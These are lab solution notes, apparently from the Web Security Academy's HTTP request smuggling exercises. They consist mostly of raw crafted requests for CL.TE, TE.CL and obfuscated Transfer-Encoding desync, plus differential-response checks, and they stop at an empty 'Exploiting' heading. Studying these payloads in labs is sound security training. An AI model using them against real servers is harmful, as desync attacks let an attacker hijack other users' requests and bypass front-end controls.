# HTTP request smuggling

## How to perform an HTTP request smuggling attack

### HTTP request smuggling, basic CL.TE vulnerability
1st request
```
POST /post/comment HTTP/1.1
...
Transfer-Encoding: chunked

0

G
---
HTTP/1.1 400 Bad Request
Content-Type: application/json
Keep-Alive: timeout=0
Connection: close
Content-Length: 19

"Missing parameter"
```

2nd request
```
POST /post/comment HTTP/1.1
...
Transfer-Encoding: chunked

0

G
---
HTTP/1.1 403 Forbidden
Content-Type: application/json
Connection: close
Keep-Alive: timeout=0
Content-Length: 27

"Unrecognized method GPOST"
```

### HTTP request smuggling, basic TE.CL vulnerability
Send twice
```
POST / HTTP/1.1
Host: acba1f431f8efb5580ada06100c10063.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

### HTTP request smuggling, obfuscating the TE header
Send twice
```
POST / HTTP/1.1
Host: ac131f3b1f7bfd5b80f42b080013003d.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: hello

12
GPOST / HTTP/1.1

0


```

## Finding HTTP request smuggling vulnerabilities

### HTTP request smuggling, confirming a CL.TE vulnerability via differential responses
Send twice
```
POST / HTTP/1.1
Host: ac251f381f1a5d6a804fc8a300f20094.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 53
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /404 HTTP/1.1
Foo: x


```

### HTTP request smuggling, confirming a TE.CL vulnerability via differential responses
Send twice
```
POST / HTTP/1.1
Host: acf51f6c1e75983c805a039b004500bc.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

5e
POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

## Exploiting HTTP request smuggling vulnerabilities